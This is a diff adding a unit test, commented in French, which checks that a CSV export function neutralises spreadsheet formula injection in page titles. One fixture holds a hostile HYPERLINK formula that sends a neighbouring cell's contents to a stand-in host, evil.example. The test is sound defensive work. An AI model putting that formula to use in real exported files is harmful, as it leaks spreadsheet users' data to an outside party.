@@ -11,6 +11,23 @@ describe("toCsv", () => {
       "id;url;titre\n1;https://a.example/x;\"Titre, avec \"\"guillemets\"\"\"\n2;https://b.example/y;\"Ligne\nmultiple\"",
     );
   });
+
+  // Un titre vient d'une page tierce : exécuté comme formule à l'ouverture
+  // dans un tableur, il pourrait exfiltrer le voisinage (HYPERLINK, DDE).
+  it("neutralise l'injection de formule (= + - @), sans toucher au reste", () => {
+    const csv = toCsv([
+      { id: 1, url: "https://a.example/x", title: '=HYPERLINK("https://evil.example?d="&B2;"clic")' },
+      { id: 2, url: "https://b.example/y", title: "+33 1 23" },
+      { id: 3, url: "https://c.example/z", title: "@chose" },
+      { id: 4, url: "https://d.example/w", title: "-5 % sur tout" },
+      { id: 5, url: "https://e.example/v", title: "Titre ordinaire = sain" },
+    ]).split("\n");
+    expect(csv[1]).toBe('1;https://a.example/x;"\'=HYPERLINK(""https://evil.example?d=""&B2;""clic"")"');
+    expect(csv[2]).toBe("2;https://b.example/y;'+33 1 23");
+    expect(csv[3]).toBe("3;https://c.example/z;'@chose");
+    expect(csv[4]).toBe("4;https://d.example/w;'-5 % sur tout");
+    expect(csv[5]).toBe("5;https://e.example/v;Titre ordinaire = sain");
+  });
 });
 
 // downloadCsv vit dans le DOM (Blob + ancre) — jsdom n'implémente NI
